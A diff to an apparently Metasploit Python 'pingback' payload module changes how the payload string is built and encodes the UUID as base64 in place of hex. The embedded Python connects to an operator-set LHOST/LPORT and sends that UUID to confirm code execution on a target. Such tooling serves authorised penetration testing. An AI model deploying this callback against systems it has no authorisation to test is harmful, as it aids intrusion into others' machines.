@@ -27,8 +27,7 @@ module MetasploitModule
   end
 
   def generate
-    return command_string if super.nil?
-    super + command_string
+    super.to_s + command_string
   end
 
   def command_string
@@ -37,11 +36,11 @@ module MetasploitModule
       import socket as s
       so=s.socket(s.AF_INET,s.SOCK_STREAM)
       try:
-        so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
-        so.send('#{self.pingback_uuid}'.decode('hex'))
-        so.close()
+       so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
+       so.send('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.decode('base64'))
+       so.close()
       except:
-        pass
+       pass
     PYTHON
   end
 end
